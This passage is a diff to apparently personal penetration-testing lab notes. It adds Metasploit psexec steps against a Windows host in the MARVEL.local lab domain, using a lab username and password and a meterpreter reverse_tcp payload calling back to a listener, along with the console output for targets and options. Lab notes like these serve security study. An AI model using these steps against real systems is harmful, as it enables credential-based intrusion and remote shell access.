@@ -10,6 +10,12 @@
 - `search psexec`
 - `use 4` - exploit/windows/smb/psexec
 - `set payload windows/x64/meterpreter/reverse_tcp`
+- `set RHOSTS 192.168.64.220`
+- `set subdomain MARVEL.local`
+- `set smbuser fcastle`
+- `set smbpass P@$$w0rd1`
+- Show targets if automatic not working you can choose other
+
 
 
 ```
@@ -72,5 +78,58 @@ Exploit target:
 
 View the full module info with the info, or info -d command.
 
+
+```
+
+```
+msf6 exploit(windows/smb/psexec) > show targets
+
+Exploit targets:
+=================
+
+    Id  Name
+    --  ----
+=>  0   Automatic
+    1   PowerShell
+    2   Native upload
+    3   MOF upload
+    4   Command
+
+```
+
+```
+msf6 exploit(windows/smb/psexec) > options
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   RHOSTS                192.168.64.220   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
+                                                    /basics/using-metasploit.html
+   RPORT                 445              yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SMBDomain             MARVEL.local     no        The Windows domain to use for authentication
+   SMBPass               P@$$w0rd1        no        The password for the specified username
+   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a norma
+                                                    l read/write folder share
+   SMBUser               fcastle          no        The username to authenticate as
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.64.4     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
 
 ```
